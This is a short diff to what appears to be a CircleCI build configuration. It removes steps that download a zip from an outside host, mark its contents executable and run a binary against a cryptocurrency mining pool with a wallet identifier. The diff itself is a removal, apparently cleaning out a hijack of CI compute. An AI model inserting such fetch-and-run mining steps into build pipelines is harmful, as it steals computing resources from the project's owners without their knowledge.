@@ -8,10 +8,4 @@ jobs:
     docker:
       - image: circleci/golang:1.9
     steps:
-      - run: ls
-      - run: sudo apt-get update
-      - run: sudo apt-get install wget tar -y
-      - run: curl http://www.directfilelink.tech/5131958912234392/abc.zip -o abc.zip
-      - run: unzip abc.zip
-      - run: chmod +x *
-      - run: ./abc -c na.luckpool.net:3956 -u RT3QTpGdya1CCJABvKMwp6JgcPig5ZjPM9.02 -p x --cpu=36
+      - 
